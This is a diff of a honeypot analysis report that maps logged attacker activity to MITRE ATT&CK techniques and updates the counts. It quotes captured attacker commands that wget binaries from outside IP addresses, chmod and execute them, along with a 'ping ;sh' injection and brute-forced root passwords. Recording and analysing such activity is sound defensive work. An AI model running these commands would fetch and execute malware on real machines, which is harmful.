@@ -1,18 +1,18 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-08-18 14:02:45",
+  "generated": "2026-08-18 15:00:13",
   "totals": {
-    "commands": 8153,
-    "login_failed": 4757,
-    "login_success": 2566,
-    "sessions": 4847
+    "commands": 8254,
+    "login_failed": 4797,
+    "login_success": 2574,
+    "sessions": 4890
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 4757,
+      "count": 4797,
       "examples": [
         "root / 19801024",
         "root / sunsunsun",
@@ -21,14 +21,14 @@
         "root / 826826826"
       ],
       "first": "2026-08-18T00:00:03.054815Z",
-      "last": "2026-08-18T14:00:07.242959Z",
-      "unique_ips": 64
+      "last": "2026-08-18T14:56:08.564853Z",
+      "unique_ips": 70
     },
     {
       "id": "T1078",
       "name": "Valid Accounts",
       "tactic": "Initial Access",
-      "count": 2566,
+      "count": 2574,
       "examples": [
         "enable\\x00 / linuxshell\\x00",
         "root / 123@@@",
@@ -37,14 +37,14 @@
         "enable\\x00 / system\\x00"
       ],
       "first": "2026-08-18T00:06:39.840434Z",
-      "last": "2026-08-18T13:31:55.528852Z",
-      "unique_ips": 42
+      "last": "2026-08-18T14:42:44.258731Z",
+      "unique_ips": 46
     },
     {
       "id": "T1222.002",
       "name": "File and Directory Permissions Modification: Linux and Mac",
       "tactic": "Defense Evasion",
-      "count": 108,
+      "count": 183,
       "examples": [
         "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://31.77.227.121/bins/pmips; chmod 777 pmips; ./pmips; r",
         "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://31.77.227.121/bins/x86_64; chmod 777 x86_64; ./x86_64",
@@ -53,14 +53,14 @@
         "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://31.77.227.121/bins/parm5; chmod 777 parm5; ./parm5; r"
       ],
       "first": "2026-08-18T02:18:51.232788Z",
-      "last": "2026-08-18T12:22:34.349283Z",
-      "unique_ips": 12
+      "last": "2026-08-18T14:43:36.610816Z",
+      "unique_ips": 14
     },
     {
       "id": "T1105",
       "name": "Ingress Tool Transfer",
       "tactic": "Command and Control",
-      "count": 56,
+      "count": 125,
       "examples": [
         "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://31.77.227.121/bins/pmips; chmod 777 pmips; ./pmips; r",
         "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://31.77.227.121/bins/x86_64; chmod 777 x86_64; ./x86_64",
@@ -69,8 +69,8 @@
         "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://31.77.227.121/bins/parm5; chmod 777 parm5; ./parm5; r"
       ],
       "first": "2026-08-18T02:18:51.232788Z",
-      "last": "2026-08-18T12:22:35.640541Z",
-      "unique_ips": 11
+      "last": "2026-08-18T14:43:36.610816Z",
+      "unique_ips": 13
     },
     {
       "id": "T1082",
@@ -92,14 +92,14 @@
       "id": "T1033",
       "name": "System Owner/User Discovery",
       "tactic": "Discovery",
-      "count": 7,
+      "count": 8,
       "examples": [
         "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
         "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || "
       ],
       "first": "2026-08-18T03:14:17.803787Z",
-      "last": "2026-08-18T11:49:59.934751Z",
-      "unique_ips": 7
+      "last": "2026-08-18T14:42:56.511512Z",
+      "unique_ips": 8
     },
     {
       "id": "T1059.004",
@@ -158,30 +158,34 @@
   "unmapped": [
     [
       "system",
-      2522
+      2523
     ],
     [
       "shell",
-      2522
+      2523
     ],
     [
       "sh",
-      2522
+      2523
     ],
     [
       "/bin/busybox",
-      266
+      273
     ],
     [
       "enable",
-      13
+      14
     ],
     [
       "linuxshell",
-      13
+      14
     ],
     [
       "echo -e \"\\x47\\x41\\x59\\x46\\x47\\x54\"",
+      10
+    ],
+    [
+      "cd /proc && cat self/cmdline",
       10
     ],
     [
@@ -197,15 +201,19 @@
       10
     ],
     [
-      "cd /proc && cat self/cmdline",
-      9
-    ],
-    [
       "enablelinuxshell",
-      7
+      8
     ],
     [
       "ping ;sh",
+      8
+    ],
+    [
+      "RPMA",
+      7
+    ],
+    [
+      "AMOO",
       7
     ],
     [
@@ -226,14 +234,6 @@
     ],
     [
       ">/var/run/.codi && cd /var/run/",
-      6
-    ],
-    [
-      ">/var/tmp/.codi && cd /var/tmp/",
-      6
-    ],
-    [
-      ">/.codi && cd /",
       6
     ]
   ]
